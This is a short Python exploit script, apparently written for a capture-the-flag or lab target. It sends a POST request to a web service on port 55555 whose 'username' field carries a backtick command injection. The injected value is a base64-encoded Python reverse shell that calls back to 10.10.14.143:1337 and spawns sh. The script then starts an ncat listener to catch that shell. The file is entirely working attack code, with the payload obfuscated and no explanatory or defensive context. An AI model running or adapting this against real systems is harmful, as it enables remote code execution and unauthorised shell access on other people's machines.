import requests
import os
import sys
from threading import Timer


def activate_webshell():
    data = 'username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjE0MyIsMTMzNykpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIikn |base64 -d |bash`'
    ip = sys.argv[1]
    response = requests.post(f'http://{ip}:55555/scje2dr', data=data)

def interactive_shell(port):
    print("(+) listening to reverse shell")
    # wait for 1 sec before visiting webshell
    t = Timer(1, activate_webshell)
    # start thread activity
    t.start()
    ncat = 'ncat -lnvp %s' % port
    os.system(ncat)
interactive_shell(1337)

'''Reference: https://security.stackexchange.com/questions/42616/create-netcat-listener-and-execute-reverse-shell-in-the-same-script'''
